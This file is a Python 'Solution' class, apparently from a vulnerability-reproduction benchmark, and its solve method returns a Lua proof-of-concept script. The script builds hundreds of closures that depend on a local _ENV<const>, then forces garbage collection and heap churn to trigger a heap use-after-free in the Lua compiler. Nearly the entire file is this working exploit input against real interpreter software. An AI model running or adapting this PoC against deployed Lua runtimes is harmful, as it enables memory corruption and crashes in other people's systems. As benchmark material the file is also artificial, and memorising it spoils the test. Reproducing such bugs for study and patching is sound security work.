import os
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Lua PoC: Trigger incorrect code generation when _ENV is declared <const>
        # Strategy:
        # - Create multiple variations of nested closures that rely on a local _ENV<const>.
        # - Ensure no references remain to that _ENV after the outer function returns.
        # - Force aggressive garbage collection and memory churn between creation and use.
        # - Invoke the closures repeatedly to maximize the chance of exercising stale pointers.
        poc = r'''
-- PoC for: Heap Use After Free due to incorrect code generation when _ENV is <const>
-- The script creates closures referencing globals via a local _ENV<const> in an outer function.
-- If _ENV is not captured as an upvalue due to a compiler bug, it can be freed and then used.

local function stress_gc(rounds, payload)
  rounds = rounds or 3
  for r = 1, rounds do
    -- Allocate a mix of strings and tables to churn the heap, then free and collect
    local tmp = {}
    for i = 1, 25000 do
      if (i % 3) == 0 then
        tmp[i] = string.rep("X", (i % 64) + 1)
      else
        local t = {}
        for j = 1, 5 do
          t[j] = (i * 1103515245 + j) % 4294967296
        end
        tmp[i] = t
      end
    end
    if payload then payload() end
    tmp = nil
    collectgarbage('collect')
    collectgarbage('collect')
  end
end

-- Variation 1: basic environment with reads of a non-existent global
local function outer1()
  local _ENV<const> = {}
  return function()
    local s = 0
    for i = 1, 128 do
      local _ = x
      if i % 17 == 0 then s = s + (i or 0) end
    end
    return s
  end
end

-- Variation 2: environment table created earlier and assigned to _ENV<const>
local function outer2()
  local t = {}
  for i = 1, 32 do t[i] = i end
  local _ENV<const> = t
  return function()
    for i = 1, 96 do
      x = x -- write to global; forces SETTABLE on _ENV
    end
    return 0
  end
end

-- Variation 3: metatable present (not strictly needed but adds variety)
local function outer3()
  local _ENV<const> = setmetatable({}, { __index = function() return nil end })
  return function()
    local r
    for i = 1, 64 do
      r = y
    end
    return r
  end
end

-- Variation 4: access an existing field to force table read
local function outer4()
  local _ENV<const> = { a = 1 }
  return function()
    local v = 0
    for i = 1, 64 do
      v = (a or 0) + i
    end
    return v
  end
end

-- Variation 5: nested factory returning inner closure
local function outer5()
  local _ENV<const> = {}
  local function factory()
    return function()
      local zsum = 0
      for i = 1, 128 do
        if z then zsum = zsum + 1 end
      end
      return zsum
    end
  end
  return factory()
end

-- Variation 6: different control flow shapes
local function outer6()
  local _ENV<const> = {}
  return function()
    local acc = 0
    for i = 1, 128 do
      repeat
        local _ = w
      until true
      acc = acc ~ i -- bitwise xor-like if available; otherwise harmless fallback
    end
    return acc
  end
end

-- Create many closures from all variations to maximize exposure
local funs = {}
local function make_all()
  for i = 1, 500 do
    funs[#funs + 1] = outer1()
    funs[#funs + 1] = outer2()
    funs[#funs + 1] = outer3()
    funs[#funs + 1] = outer4()
    funs[#funs + 1] = outer5()
    funs[#funs + 1] = outer6()
  end
end

make_all()

-- Force collection after outer returns so that buggy code may leave _ENV unreferenced
collectgarbage('collect')
collectgarbage('collect')

-- Heap churn to reuse freed blocks
stress_gc(2)

-- Additional churn during calls
local function churn_step()
  local t = {}
  for i = 1, 4096 do
    if (i & 7) == 0 then
      t[i] = string.pack and string.pack(">I4", i) or tostring(i)
    else
      t[i] = {i, i*i}
    end
  end
end

-- Invoke closures; pcall will not mask C-level memory errors
for i = 1, #funs do
  pcall(funs[i])
  if (i % 64) == 0 then
    stress_gc(1, churn_step)
  end
end

-- Second pass after more GC
collectgarbage('collect')
stress_gc(1)
for i = 1, #funs do
  pcall(funs[i])
end

-- Done
'''
        return poc.encode('utf-8')
